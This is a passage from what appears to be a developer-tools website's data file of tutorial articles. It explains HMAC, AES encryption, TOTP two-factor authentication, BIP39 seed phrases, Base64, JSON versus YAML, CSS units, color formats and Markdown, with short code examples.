| Key required | ❌ | ✅ |
| Integrity verification | ✅ | ✅ |
| Authenticity verification | ❌ | ✅ |
| Forgeable without key | ✅ | ❌ |
| Resistance to length extension | ❌ (SHA-2) | ✅ |

## Choosing a Hash Algorithm for HMAC

| HMAC Variant | Security | Common Use |
|---|---|---|
| HMAC-MD5 | Weak | Legacy only |
| HMAC-SHA1 | Acceptable | Git, older protocols |
| HMAC-SHA256 | ✅ Strong | AWS Signature V4, most APIs |
| HMAC-SHA512 | ✅ Very strong | High-security requirements |

HMAC-SHA256 is the modern standard for most applications.

## Real-World HMAC Applications

### Webhook Signature Verification
When GitHub, Stripe, or Shopify sends a webhook to your server, they include an HMAC signature in the request headers. You verify it by computing the HMAC of the request body with your secret key and comparing.

\`\`\`javascript
// Verify a GitHub webhook
const crypto = require('crypto');

function verifySignature(secret, payload, signature) {
  const computed = 'sha256=' + crypto
    .createHmac('sha256', secret)
    .update(payload)
    .digest('hex');
  return crypto.timingSafeEqual(
    Buffer.from(computed),
    Buffer.from(signature)
  );
}
\`\`\`

Note the use of \`timingSafeEqual\` — comparing MAC values character by character leaks timing information that attackers can exploit. Always use constant-time comparison.

### AWS Signature Version 4
Every AWS API request is signed with HMAC-SHA256 using a derivative of your secret access key:

\`\`\`
SigningKey = HMAC(HMAC(HMAC(HMAC("AWS4" + SecretKey, Date), Region), Service), "aws4_request")
Signature = HMAC(SigningKey, StringToSign)
\`\`\`

This multi-level derivation means even if one request's signing key is somehow exposed, it cannot be used to sign requests for other dates, regions, or services.

### JWT HS256 Signing
When a JWT uses the HS256 algorithm, it's signed with HMAC-SHA256:

\`\`\`javascript
const signature = HMAC_SHA256(secret, base64url(header) + '.' + base64url(payload));
\`\`\`

### Cookie and Session Integrity
Express.js and similar frameworks sign cookies with HMAC to prevent tampering:

\`\`\`javascript
// Express cookie-session uses HMAC internally
app.use(session({
  secret: 'your-secret-key',  // Used for HMAC signing
  resave: false,
  saveUninitialized: true
}));
\`\`\`

## Security Considerations

1. **Key length** — Use at least 32 bytes (256 bits) for HMAC-SHA256 keys.
2. **Key rotation** — Rotate HMAC keys periodically. When rotating, support a brief transition window where both old and new keys are valid.
3. **Constant-time comparison** — Always compare MACs in constant time to prevent timing attacks.
4. **Key storage** — Never hard-code HMAC secrets in source code. Use environment variables or a secrets manager.

## Using This Tool

Enter your message and secret key, select the hash algorithm (MD5, SHA-1, SHA-256, SHA-384, SHA-512), and the tool computes the HMAC in your browser. You can output the result in hex (default), Base64, or Base64URL format.

→ Try the [HMAC Generator](/hmac-generator)`,
  },
  {
    slug: 'encryption-tool-guide',
    toolPath: '/encryption',
    title: 'Text Encryption Online: AES, DES, and Symmetric Encryption Explained',
    description: 'Encrypt and decrypt text using AES, DES, and other algorithms. Learn how symmetric encryption works and when to use it.',
    keywords: ['text encryption', 'AES encryption', 'encrypt online', 'symmetric encryption', 'decrypt text'],
    category: 'Crypto',
    publishedAt: '2025-06-09',
    content: `## Symmetric vs. Asymmetric Encryption

**Symmetric encryption** uses the same key to both encrypt and decrypt data. It's fast, efficient, and ideal for encrypting large amounts of data. The challenge is key distribution — both parties need to share the secret key securely before communicating.

**Asymmetric encryption** (like RSA) uses a public/private key pair. It solves the key distribution problem but is much slower. In practice, most systems use both: asymmetric encryption to securely exchange a symmetric key, then symmetric encryption for the actual data transfer. This is exactly how HTTPS works.

## The AES Algorithm

**AES** (Advanced Encryption Standard) is the world's most widely used symmetric cipher, standardized by NIST in 2001. It replaced DES and 3DES and is used in virtually every modern security protocol — TLS, disk encryption, VPNs, and more.

AES operates on 128-bit blocks of data (16 bytes at a time) using key sizes of 128, 192, or 256 bits. It applies multiple rounds of substitution, permutation, and mixing transformations.

## AES Key Sizes

| Variant | Key Size | Rounds | Security |
|---|---|---|---|
| AES-128 | 128 bits (16 bytes) | 10 | ✅ Secure |
| AES-192 | 192 bits (24 bytes) | 12 | ✅ Secure |
| AES-256 | 256 bits (32 bytes) | 14 | ✅ Recommended |

There's no practical difference in security between AES-128 and AES-256 — both are immune to brute-force attacks with current and foreseeable technology. AES-256 provides a comfortable security margin against quantum computers (which theoretically halve the effective key length through Grover's algorithm).

## Block Cipher Modes

A block cipher like AES can only encrypt exactly one 128-bit block at a time. **Modes of operation** define how to apply a block cipher to arbitrary-length data.

### ECB (Electronic Codebook) — Never Use
Each block is encrypted independently. Identical plaintext blocks produce identical ciphertext blocks. This reveals patterns in structured data (the classic example is encrypting an image — shapes remain visible).

### CBC (Cipher Block Chaining)
Each block is XORed with the previous ciphertext block before encryption. Requires a random **Initialization Vector (IV)** for the first block. The IV must be unique per encryption but doesn't need to be secret.

\`\`\`
C₀ = IV
Cᵢ = Encrypt(K, Pᵢ ⊕ Cᵢ₋₁)
\`\`\`

Good for file encryption. Requires padding to handle non-block-sized data.

### GCM (Galois/Counter Mode) — Recommended
Combines counter mode (stream cipher) with a Galois Message Authentication Code (GMAC). Provides **authenticated encryption**: the output includes an authentication tag that detects any tampering.

AES-256-GCM is the gold standard for symmetric encryption — it's what TLS 1.3 uses for HTTPS.

### CTR (Counter Mode)
Encrypts sequential counter values and XORs with plaintext. Can be parallelized and doesn't require padding. No authentication.

## Algorithms Comparison

| Algorithm | Status | Key Size | Security |
|---|---|---|---|
| DES | 🔴 Broken | 56 bits | Cracked in 1999 |
| 3DES | 🟡 Deprecated | 112/168 bits | Slow, being retired |
| AES-128 | ✅ Secure | 128 bits | Standard |
| AES-256 | ✅ Recommended | 256 bits | Quantum-resistant margin |
| ChaCha20 | ✅ Modern | 256 bits | Fast on mobile/embedded |

3DES (Triple DES) is used in legacy systems — avoid it for new development. AES has completely superseded it.

## Key Derivation from Passwords

When encrypting with a password rather than a random key, you must use a **Key Derivation Function (KDF)** to transform the password into a proper encryption key. Never use a password directly as an AES key.

\`\`\`javascript
// Using PBKDF2 to derive a key from a password
const key = await crypto.subtle.importKey(...);
const derivedKey = await crypto.subtle.deriveKey(
  { name: 'PBKDF2', salt, iterations: 100000, hash: 'SHA-256' },
  key, { name: 'AES-GCM', length: 256 }, false, ['encrypt', 'decrypt']
);
\`\`\`

Common KDFs: PBKDF2, scrypt, Argon2. Use high iteration counts (100,000+ for PBKDF2) to slow down brute-force attacks.

## Practical Encryption Examples

\`\`\`javascript
// Web Crypto API (browser)
async function encryptText(plaintext, password) {
  const encoder = new TextEncoder();
  const data = encoder.encode(plaintext);
  const salt = crypto.getRandomValues(new Uint8Array(16));
  const iv = crypto.getRandomValues(new Uint8Array(12));

  const keyMaterial = await crypto.subtle.importKey(
    'raw', encoder.encode(password), 'PBKDF2', false, ['deriveKey']
  );
  const key = await crypto.subtle.deriveKey(
    { name: 'PBKDF2', salt, iterations: 100000, hash: 'SHA-256' },
    keyMaterial, { name: 'AES-GCM', length: 256 }, false, ['encrypt']
  );

  const encrypted = await crypto.subtle.encrypt({ name: 'AES-GCM', iv }, key, data);
  return { encrypted, salt, iv };
}
\`\`\`

→ Try the [Encryption Tool](/encryption)`,
  },
  {
    slug: 'otp-authenticator-guide',
    toolPath: '/otp-generator',
    title: 'OTP / TOTP Explained: How Two-Factor Authentication Works',
    description: 'Learn how Time-based One-Time Passwords (TOTP) work. Generate and validate OTP codes for 2FA systems.',
    keywords: ['OTP generator', 'TOTP', 'two-factor authentication', '2FA code', 'authenticator app'],
    category: 'Web',
    publishedAt: '2025-06-10',
    content: `## What Is Two-Factor Authentication (2FA)?

**Two-Factor Authentication (2FA)** adds a second layer of verification beyond a password. Even if an attacker steals your password, they cannot log in without also possessing your second factor. The three categories of authentication factors are:

- **Something you know** — Password, PIN, security questions
- **Something you have** — Phone, hardware token, smart card
- **Something you are** — Fingerprint, face ID, voice

Most 2FA implementations combine a password (something you know) with a one-time code from a mobile app (something you have).

## How TOTP Works

**TOTP** (Time-based One-Time Password) is defined in RFC 6238. It generates a 6-digit code that changes every 30 seconds, synchronized between your app and the server without any network communication.

### Setup Process:
1. The server generates a random **secret key** (usually 20 bytes / 160 bits).
2. The server displays the secret as a QR code.
3. The user scans it with an authenticator app (Google Authenticator, Authy, etc.).
4. Both the server and app now share the same secret.

### Code Generation:
\`\`\`
counter = floor(currentUnixTime / 30)
HOTP = HMAC-SHA1(secret, counter)
TOTP = HOTP truncated to 6 digits
\`\`\`

Because both parties compute the TOTP from the same counter (current time ÷ 30) and the same secret, they always arrive at the same 6-digit code — no network required.

### Verification:
The server checks the submitted code against the current TOTP and usually the previous and next (to account for clock skew and network latency). A valid code is accepted once and invalidated to prevent replay attacks.

## HOTP: The Counter-Based Predecessor

**HOTP** (HMAC-based One-Time Password, RFC 4226) uses an incrementing counter instead of time. The counter advances each time a code is generated.

- **Advantage:** Works without clock synchronization, good for hardware tokens.
- **Disadvantage:** Counter can get out of sync if codes are generated without being used.

TOTP is generally preferred for software authenticators.

## Authenticator Apps

| App | Open Source | Multi-device | Backup |
|---|---|---|---|
| Google Authenticator | ❌ | iOS + Android | Cloud backup option |
| Authy | ❌ | Yes | Encrypted cloud backup |
| Microsoft Authenticator | ❌ | Yes | Cloud backup |
| Aegis | ✅ | Android | Encrypted file backup |
| Raivo | ✅ | iOS | iCloud backup |

For maximum security, Aegis (Android) and Raivo (iOS) are recommended — both are open source and support encrypted local/cloud backups.

## TOTP Security Properties

### Phishing Resistance
TOTP codes are valid for only 30 seconds. If a user is tricked into entering a code on a phishing site, the attacker must use it before it expires — and it can only be used once.

### Replay Prevention
Because each code is time-limited and single-use, replaying an intercepted code won't work.

### Brute Force Resistance
With 10^6 possible 6-digit codes and 30-second validity, an attacker can check 3 codes/second before the window expires. Lockout policies further limit attempts.

## Limitations of TOTP

- **SIM swapping** — SMS-based 2FA is vulnerable; TOTP (app-based) is not.
- **Real-time phishing** — Sophisticated attacks proxy credentials in real time, bypassing TOTP. Hardware keys (FIDO2/WebAuthn) prevent this.
- **Device loss** — Losing your phone without backup codes locks you out. Always save backup codes.
- **Account recovery** — Many services have weak account recovery that bypasses 2FA entirely.

## Implementing TOTP in Your Application

\`\`\`javascript
// Using 'otplib' (npm)
import { authenticator } from 'otplib';

// Generate secret (once, during user setup)
const secret = authenticator.generateSecret();

// Generate current TOTP
const token = authenticator.generate(secret);

// Verify user-submitted token
const isValid = authenticator.verify({ token, secret });
\`\`\`

\`\`\`python
# Using 'pyotp' (pip)
import pyotp

secret = pyotp.random_base32()
totp = pyotp.TOTP(secret)
token = totp.now()           # Current code
totp.verify(token)           # Returns True
\`\`\`

## Using This Tool

This OTP generator accepts a TOTP secret key (Base32 encoded) and displays the current code along with a countdown timer. You can also validate a code against a secret — useful for testing your TOTP implementation.

→ Try the [OTP Generator](/otp-generator)`,
  },
  {
    slug: 'bip39-mnemonic-guide',
    toolPath: '/bip39-generator',
    title: 'BIP39 Mnemonic Phrases: How Crypto Wallets Are Backed Up',
    description: 'Understand BIP39 mnemonic seed phrases used in cryptocurrency wallets. Learn how 12-24 words store your entire wallet.',
    keywords: ['BIP39 generator', 'mnemonic phrase', 'seed phrase', 'crypto wallet backup', 'BIP39 wordlist'],
    category: 'Crypto',
    publishedAt: '2025-06-11',
    content: `## What Is BIP39?

**BIP39** (Bitcoin Improvement Proposal 39) defines a standard for creating human-readable backup phrases for cryptocurrency wallets. These phrases — called **seed phrases**, **mnemonic phrases**, or **recovery phrases** — consist of 12, 18, or 24 common English words that encode the entropy used to derive all of a wallet's private keys.

BIP39 was authored by Marek Palatinus, Pavol Rusnak, Aaron Voisine, and Sean Bowe in 2013. Today it's the universal standard supported by virtually every hardware wallet (Ledger, Trezor), software wallet (MetaMask, Trust Wallet, Exodus), and exchange self-custody tool.

## Why Mnemonic Phrases?

Cryptocurrency private keys are 256-bit numbers — utterly unmemorizable by humans. BIP39 maps this entropy to a sequence of common words from a standardized 2048-word list, making the backup human-writable, human-readable, and robust to transcription errors.

Compare:
- **Raw private key:** \`e9873d79c6d87dc0fb6a5778633389f4453213303da61f20bd67fc233aa33262\`
- **BIP39 phrase:** \`witch collapse practice feed shame open despair creek road again ice least\`

Both represent the same entropy. The phrase is far more practical to write on paper, read aloud, or verify for typos.

## The BIP39 Process Step by Step

### 1. Generate Entropy
Create a cryptographically random byte sequence:
- **12 words:** 128 bits of entropy
- **18 words:** 192 bits of entropy
- **24 words:** 256 bits of entropy

### 2. Compute Checksum
Compute SHA-256 of the entropy. Take the first ENT/32 bits of the hash as a checksum.
- 128-bit entropy → 4-bit checksum → 132 total bits
- 256-bit entropy → 8-bit checksum → 264 total bits

### 3. Split Into 11-bit Groups
Concatenate entropy + checksum, then split into groups of 11 bits. Each group is an index (0–2047) into the BIP39 word list.

### 4. Map to Words
Replace each 11-bit index with the corresponding word from the 2048-word list.

\`\`\`
128 bits entropy + 4 bits checksum = 132 bits
132 bits / 11 bits per word = 12 words
\`\`\`

### 5. Derive Master Seed
The mnemonic phrase (with optional passphrase) is processed through PBKDF2-HMAC-SHA512 for 2048 iterations to produce a 512-bit master seed. From this seed, all wallet keys are derived following BIP32.

## Security of BIP39 Phrases

A 12-word phrase encodes 128 bits of entropy. The total number of possible 12-word phrases is:

\`\`\`
2^128 ≈ 3.4 × 10^38
\`\`\`

Even if an attacker could check one trillion (10^12) phrases per second, it would take 10^19 years to exhaust all 12-word phrases — longer than the age of the universe. 24-word phrases (256 bits) are effectively impossible to brute-force even with quantum computers.

## The BIP39 Word List

The English BIP39 word list contains exactly 2048 words, carefully chosen to be:
- **Distinct in the first 4 characters** — You can identify each word from its first 4 letters, reducing transcription ambiguity.
- **Short** — Most words are 3–8 characters.
- **Common** — Familiar English words, avoiding technical terms.

Other language word lists exist (Japanese, Spanish, Korean, French, Italian, Czech, Portuguese, Chinese) but English is the most universally supported.

## Passphrase (25th Word)

BIP39 supports an optional **passphrase** (sometimes called the "25th word") that's combined with the mnemonic to derive the seed. This provides two layers of security:
- The physical mnemonic phrase
- The memorized passphrase

Even if someone finds your physical backup, they can't access funds without the passphrase. This is particularly useful for hardware wallets.

**Warning:** If you forget the passphrase, the funds are permanently lost. There's no recovery mechanism.

## Storing Your Seed Phrase Safely

| Method | Security | Durability |
|---|---|---|
| Paper | Low (fire/water) | Poor |
| Metal plate (Cryptosteel) | High | Excellent |
| Digital (unencrypted) | Very low | Good |
| Password manager | Good | Good |
| Memory only | N/A | Poor (forget) |

Best practices:
- **Never photograph your seed phrase** — Photos back up to cloud storage you may not control.
- **Never type it into any website** — Including "recovery" sites (many are phishing).
- **Make multiple physical copies** — Store in different secure locations (home safe, safety deposit box, trusted family member).
- **Use a metal backup** — Paper burns and degrades; stainless steel survives house fires.
- **Never share with anyone** — Seed phrases are bearer instruments. Whoever has the words controls the funds.

## This Tool's Safety

This BIP39 generator runs entirely in your browser using the Web Crypto API for entropy. No seed phrases, private keys, or wallet data are transmitted to any server. For generating real wallet seed phrases, verify the tool is running locally with no network access.

→ Try the [BIP39 Generator](/bip39-generator)`,
  },

  // ─── Converter ────────────────────────────────────────────────
  {
    slug: 'base64-encoding-explained',
    toolPath: '/base64-string-converter',
    title: 'Base64 Encoding Explained: What It Is and When to Use It',
    description: 'Learn what Base64 encoding is, how to encode and decode strings, and when (and when not) to use it.',
    keywords: ['base64 encode', 'base64 decode', 'base64 online', 'base64 string converter', 'encoding'],
    category: 'Converter',
    publishedAt: '2025-06-15',
    content: `## What Is Base64 Encoding?

Base64 is a binary-to-text encoding scheme that represents binary data using a set of 64 printable ASCII characters. The name "Base64" comes from the radix-64 representation. The 64 characters used are: A-Z (26), a-z (26), 0-9 (10), + and / (2), with = used as padding.

Base64 was designed to safely transmit binary data over channels designed to handle text, such as email (SMTP) or embedding binary content in XML or JSON.

## How Base64 Encoding Works

Base64 takes 3 bytes (24 bits) of input at a time and produces 4 characters of output. Each output character represents 6 bits of input data.

\`\`\`
Input bytes:    01001101  01100001  01101110
Group into 6:   010011  010110  000101  101110
Base64 index:   19      22      5       46
Base64 chars:   T       W       F       u
\`\`\`

The encoding increases size by approximately 33% (every 3 bytes becomes 4 characters). If the input isn't divisible by 3, \`=\` padding is added.

## Base64 Encoding Examples

\`\`\`
Input:    "Hello"
Base64:   SGVsbG8=

Input:    "Man"
Base64:   TWFu

Input:    "Ma"  (needs padding)
Base64:   TWE=
\`\`\`

## Common Uses of Base64

### HTTP Basic Authentication
HTTP Basic Auth encodes credentials as \`username:password\` in Base64:
\`\`\`
Authorization: Basic dXNlcm5hbWU6cGFzc3dvcmQ=
\`\`\`
This encoding is trivially reversible and provides no security without HTTPS.

### Data URIs
Embed images directly in HTML without separate HTTP requests:
\`\`\`html
<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAUA..." />
\`\`\`

### JWT Tokens
JSON Web Tokens encode their header and payload as Base64URL (a URL-safe variant of Base64).

### Email Attachments (MIME)
MIME encoding uses Base64 to attach binary files (images, PDFs, executables) to email messages.

### SSH Public Keys
SSH public keys are stored and transmitted in Base64 format.

## Base64 vs Base64URL

Standard Base64 uses \`+\` and \`/\` which are special characters in URLs. **Base64URL** replaces these:
- \`+\` becomes \`-\`
- \`/\` becomes \`_\`
- \`=\` padding is removed

Use Base64URL whenever the encoded string will appear in URLs, filenames, or HTTP headers.

## Base64 Is NOT Encryption

This is the most common misconception. Base64 is trivially reversible without any key:

\`\`\`javascript
atob('SGVsbG8=') // "Hello"
\`\`\`

Anyone who sees Base64-encoded data can immediately decode it. Never use Base64 to hide passwords, API keys, or sensitive information.

## Size Overhead

Base64 encoding increases data size by approximately 33%:
- 100 bytes becomes approximately 136 Base64 characters
- 1 MB image becomes approximately 1.37 MB Base64 string

## Decoding Base64 in Code

\`\`\`javascript
// Browser
const decoded = atob('SGVsbG8=');  // "Hello"
const encoded = btoa('Hello');     // "SGVsbG8="

// Node.js
Buffer.from('SGVsbG8=', 'base64').toString('utf8')  // "Hello"
Buffer.from('Hello').toString('base64')              // "SGVsbG8="
\`\`\`

\`\`\`python
import base64
base64.b64decode('SGVsbG8=').decode()   # "Hello"
base64.b64encode(b'Hello').decode()     # "SGVsbG8="
\`\`\`

## When to Use Base64

Use Base64 when embedding binary data in text formats (HTML, CSS, JSON, XML), transmitting binary over text protocols, or encoding binary data that must survive text transformations.

Do not use Base64 when you need security (it provides none), when size efficiency matters (it adds 33% overhead), or when the data is already text.

-> Try the [Base64 String Converter](/base64-string-converter)`,
  },
  {
    slug: 'json-to-yaml-complete-guide',
    toolPath: '/json-to-yaml-converter',
    title: 'JSON to YAML: Complete Conversion Guide with Examples',
    description: 'Convert JSON to YAML instantly. Understand the differences, when to use each format, and common gotchas.',
    keywords: ['JSON to YAML', 'convert JSON YAML', 'YAML vs JSON', 'YAML formatter', 'JSON converter'],
    category: 'Converter',
    publishedAt: '2025-06-16',
    content: `## Why Convert Between JSON and YAML?

JSON (JavaScript Object Notation) and YAML (YAML Ain't Markup Language) represent the same types of data structures but with very different syntax philosophies. Knowing when and how to convert between them is essential for modern development workflows.

## JSON: The API Standard

JSON was designed for machine-to-machine communication. Its syntax is strict, unambiguous, and directly maps to JavaScript objects.

\`\`\`json
{
  "name": "John Doe",
  "age": 30,
  "active": true,
  "address": {
    "city": "New York",
    "country": "US"
  },
  "hobbies": ["reading", "coding"]
}
\`\`\`

JSON strengths include universal support in every programming language, strict syntax that leaves no ambiguity, direct parseability in JavaScript, and compact size when minified.

JSON weaknesses include no support for comments (a significant limitation for configuration files) and more verbose syntax with quotes around all keys.

## YAML: The Configuration Standard

YAML uses indentation and minimal punctuation to represent the same structures. It is the dominant format for configuration files in DevOps (Docker Compose, Kubernetes, GitHub Actions, Ansible).

\`\`\`yaml
name: John Doe
age: 30
active: true
address:
  city: New York
  country: US
hobbies:
  - reading
  - coding
\`\`\`

YAML strengths include support for comments with the # character, more human-readable nested structures, natural multi-line strings, less punctuation, and support for references and anchors enabling DRY configuration.

YAML weaknesses include indentation-sensitivity (tabs are illegal), implicit type coercion that leads to bugs, multiple valid representations, and slower parsing.

## Side-by-Side Comparison

| Feature | JSON | YAML |
|---|---|---|
| Comments | No | Yes (# comment) |
| Trailing commas | Not allowed | Not applicable |
| Multiline strings | Requires \\n escape | Natural block style |
| Anchors / references | No | Yes (&anchor, *ref) |
| Primary use | APIs, data exchange | Config files |
| File extensions | .json | .yaml or .yml |

## Common YAML Gotchas

### Type Coercion
YAML automatically converts unquoted values to their natural types:
\`\`\`yaml
port: 8080       # Integer, not string!
enabled: yes     # Boolean true, not string!
version: 1.0     # Float!
zip: 01234       # Integer (drops leading zero)!
\`\`\`

To force strings, quote them: \`port: "8080"\`, \`zip: "01234"\`.

### Norway Problem
In YAML 1.1, country codes NO, ON, OFF, YES, NO are parsed as booleans. YAML 1.2 fixed this.

### Tabs Are Illegal
YAML strictly requires spaces for indentation. Tabs cause parse errors.

## YAML Anchors and Aliases

YAML supports a DRY principle using anchors (&) and aliases (*):

\`\`\`yaml
defaults: &defaults
  database: postgres
  pool: 10
  timeout: 30

development:
  <<: *defaults
  database: sqlite

production:
  <<: *defaults
  pool: 20
\`\`\`

## Multi-line Strings in YAML

\`\`\`yaml
# Literal block (|) - preserves newlines
description: |
  First line
  Second line

# Folded block (>) - converts newlines to spaces  
description: >
  This long sentence will
  be joined as one line.
\`\`\`

## JSON to YAML Conversion Rules

| JSON | YAML |
|---|---|
| {} object | Key-value pairs with indentation |
| [] array | Items prefixed with - |
| "string" | Unquoted (or quoted if needed) |
| 123 number | 123 |
| true/false | true/false |
| null | null or ~ |

-> Try the [JSON to YAML Converter](/json-to-yaml-converter)`,
  },
  {
    slug: 'css-unit-converter-guide',
    toolPath: '/css-unit-converter',
    title: 'CSS Units Explained: px, rem, em, vw, vh — When to Use Each',
    description: 'Master CSS units with our complete guide. Convert between px, rem, em, vw, vh and understand when each unit is appropriate.',
    keywords: ['CSS units', 'px to rem', 'em to px', 'CSS unit converter', 'rem vs em', 'viewport units'],
    category: 'Converter',
    publishedAt: '2025-06-17',
    content: `## The CSS Unit Landscape

CSS offers more than a dozen unit types, each suited to different contexts. Understanding when to use each unit is fundamental to building responsive, accessible, and maintainable stylesheets.

Units fall into two categories: **Absolute units** which have a fixed size regardless of context (px, pt, cm, mm, in), and **Relative units** which have a size relative to something else (rem, em, %, vw, vh, ch, ex).

## Pixels (px): The Foundation

A CSS pixel (\`1px\`) was originally intended to represent one physical pixel on a screen. On modern high-DPI (Retina) displays, this is no longer true. The CSS pixel is now defined as approximately 1/96 of an inch at arm's length.

Use px for borders, box shadows, specific fixed-size elements like icons, and when you explicitly do not want the size to scale with user preferences.

## rem: The Accessibility Unit

\`rem\` (root em) is relative to the font size of the \`html\` element. The browser's default root font size is 16px, meaning \`1rem = 16px\` unless changed.

\`\`\`css
html { font-size: 16px; } /* default */

h1 { font-size: 2rem; }        /* 32px */
p  { font-size: 1rem; }        /* 16px */
.small { font-size: 0.75rem; } /* 12px */
\`\`\`

The accessibility advantage is that users can set their preferred base font size in browser settings. Elements sized in \`rem\` respect this preference; elements sized in \`px\` do not. For accessibility compliance (WCAG), use \`rem\` for font sizes.

## em: The Contextual Unit

\`em\` is relative to the font size of the current element. This can cascade in unexpected ways:

\`\`\`css
.parent { font-size: 20px; }
.child  { font-size: 0.75em; }      /* 15px (0.75 x 20) */
.grandchild { font-size: 0.75em; }  /* 11.25px (0.75 x 15) */
\`\`\`

em is useful for spacing (padding, margin) that should scale proportionally with the element's own text size. Prefer rem over em for font sizes to avoid cascading complexity.

## Viewport Units: vw, vh, vmin, vmax

Viewport units are relative to the browser window size:

| Unit | Definition |
|---|---|
| 1vw | 1% of viewport width |
| 1vh | 1% of viewport height |
| 1vmin | 1% of the smaller dimension |
| 1vmax | 1% of the larger dimension |
| 1svh | 1% of small viewport height (mobile) |
| 1dvh | 1% of dynamic viewport height |

Common uses:
\`\`\`css
.hero { height: 100vh; }           /* Full-screen hero section */
.fluid-text { font-size: 4vw; }    /* Text scales with window */
.max-width { max-width: 90vw; }    /* 90% of viewport width */
\`\`\`

On mobile browsers, \`100vh\` includes the browser chrome. Use \`100svh\` for content that should fit without scrolling on mobile.

## Percentage (%): Parent-Relative

Percentage values are relative to the parent element:
\`\`\`css
.container { width: 800px; }
.child { width: 50%; }  /* 400px */
\`\`\`

For padding and margin, percentage values are relative to the parent's width (even for vertical padding/margin):
\`\`\`css
.aspect-ratio-box {
  padding-top: 56.25%; /* Creates 16:9 aspect ratio */
}
\`\`\`

## ch: Character-Based Width

\`1ch\` equals the width of the "0" character in the current font:
\`\`\`css
input { width: 20ch; }    /* Fits ~20 characters */
p { max-width: 65ch; }    /* Optimal reading line length */
\`\`\`

The optimal reading line length for body text is 45-75 characters (about 65ch in most fonts).

## CSS Unit Quick Reference

| Unit | Relative To | Best For |
|---|---|---|
| px | Screen pixels | Borders, shadows, icons |
| rem | Root font size | Font sizes, spacing |
| em | Parent font size | Component-relative spacing |
| % | Parent element | Fluid layouts |
| vw/vh | Viewport size | Full-screen layouts, fluid text |
| ch | "0" character width | Input sizing, line length |

## Conversion Formulas

\`\`\`
px to rem: rem = px / root-font-size
rem to px: px = rem * root-font-size

px to vw:  vw  = (px / viewport-width) * 100
px to em:  em  = px / current-element-font-size
\`\`\`

-> Try the [CSS Unit Converter](/css-unit-converter)`,
  },
  {
    slug: 'color-converter-hex-rgb-hsl',
    toolPath: '/color-converter',
    title: 'Color Formats Explained: HEX, RGB, HSL, and How to Convert Between Them',
    description: 'Learn about web color formats: HEX, RGB, RGBA, HSL, HSLA. Convert between them instantly.',
    keywords: ['color converter', 'hex to rgb', 'rgb to hsl', 'color formats', 'CSS colors'],
    category: 'Converter',
    publishedAt: '2025-06-18',
    content: `## Why Color Formats Matter

Web developers work with color in multiple formats depending on the context: hex codes from design tools like Figma, RGB values in CSS, HSL for programmatic color manipulation, and HSB (HSV) in image editors like Photoshop. Understanding these formats and how to convert between them is essential for modern front-end development.

## HEX: The Design Standard

Hexadecimal color codes represent RGB values in base-16:

\`\`\`
#RRGGBB
#FF5733   -> R=255, G=87, B=51
\`\`\`

Each channel (R, G, B) uses 2 hex digits (0-F, representing 0-255). Short hex (#RGB) expands to #RRGGBB:
- \`#F00\` -> \`#FF0000\` (pure red)
- \`#FFF\` -> \`#FFFFFF\` (white)

With alpha transparency: \`#RRGGBBAA\` - for example, \`#FF573380\` is 50% transparent orange.

Hex is best for design handoffs (Figma, Sketch output hex), CSS/HTML color values, and version control (compact, diff-friendly).

## RGB: The Screen Model

RGB (Red, Green, Blue) directly maps to how screens create colors by mixing light:

\`\`\`css
color: rgb(255, 87, 51);
color: rgba(255, 87, 51, 0.5); /* 50% transparent */
\`\`\`

Each channel ranges from 0-255. All zeros equals black; all 255s equals white.

Modern CSS notation uses space-separated values:
\`\`\`css
color: rgb(255 87 51);           /* CSS Color Level 4 */
color: rgb(255 87 51 / 50%);    /* With alpha */
\`\`\`

RGB is best for CSS color mixing, Canvas API drawing operations, and programmatic color generation.

## HSL: The Intuitive Model

HSL (Hue, Saturation, Lightness) maps more closely to how humans think about color:

\`\`\`css
color: hsl(11, 100%, 60%);  /* Orange */
color: hsla(11, 100%, 60%, 0.5); /* 50% transparent */
\`\`\`

- **Hue** (0-360 degrees): Position on the color wheel. 0 degrees is red, 120 degrees is green, 240 degrees is blue.
- **Saturation** (0-100%): Gray (0%) to vivid (100%)
- **Lightness** (0-100%): Black (0%) through color (50%) to white (100%)

HSL is ideal for programmatic color manipulation because you can darken or lighten by adjusting the L value, and create color palettes by keeping the same H while varying S and L.

\`\`\`css
/* Create a button hover by adjusting lightness */
.button { background: hsl(220, 90%, 55%); }
.button:hover { background: hsl(220, 90%, 45%); }
\`\`\`

## HSB/HSV: The Photoshop Model

HSB (Hue, Saturation, Brightness), also called HSV (Value), is used by Adobe software and many color pickers:
- **Hue** (0-360 degrees): Same as HSL
- **Saturation** (0-100%): White (0%) to pure color (100%)  
- **Brightness/Value** (0-100%): Black (0%) to full color (100%)

HSB and HSL look similar but behave differently. Neither is natively supported in CSS - you need to convert to RGB or HSL first.

## OKLCH: The Modern Perceptual Model

CSS Color Level 4 introduced OKLCH (Lightness, Chroma, Hue in the OKLab color space):

\`\`\`css
color: oklch(60% 0.2 30);  /* Lightness, Chroma, Hue */
\`\`\`

OKLCH is perceptually uniform, meaning equal numeric changes produce equal perceived color differences. This makes it ideal for accessible color palettes and theme color systems.

## Contrast and Accessibility

Color contrast is crucial for accessibility (WCAG 2.1). The contrast ratio between text and background must be at least 4.5:1 for normal text (Level AA), 3:1 for large text (Level AA), or 7:1 for enhanced accessibility (Level AAA).

Contrast ratio = (L1 + 0.05) / (L2 + 0.05) where L1 and L2 are relative luminance values.

-> Try the [Color Converter](/color-converter)`,
  },
  {
    slug: 'markdown-to-html-guide',
    toolPath: '/markdown-to-html',
    title: 'Markdown to HTML: A Practical Guide for Developers and Writers',
    description: 'Convert Markdown to clean HTML instantly. Learn Markdown syntax, flavors, and best practices.',
    keywords: ['markdown to html', 'markdown converter', 'markdown syntax', 'convert markdown', 'markdown online'],
    category: 'Converter',
    publishedAt: '2025-06-19',
    content: `## What Is Markdown?

**Markdown** is a lightweight markup language created by John Gruber in 2004, designed to be easy to read and write as plain text while converting cleanly to HTML. It's used throughout the web for documentation, README files, blog posts, forum posts (Reddit, Stack Overflow), and content management systems.

The key insight behind Markdown: the plain-text source should look like natural text formatting conventions people already use in emails and text documents.

## Core Markdown Syntax

### Headings
\`\`\`markdown
# H1 Heading
## H2 Heading
### H3 Heading
#### H4 Heading
\`\`\`

### Emphasis and Inline Code
\`\`\`markdown
*italic* or _italic_
**bold** or __bold__
***bold italic***
~~strikethrough~~
\`inline code\`
\`\`\`

### Links and Images
\`\`\`markdown
[Link text](https://example.com "Optional title")
![Alt text](image.jpg "Optional title")
[Reference link][reference-id]
[reference-id]: https://example.com
\`\`\`

### Lists
\`\`\`markdown
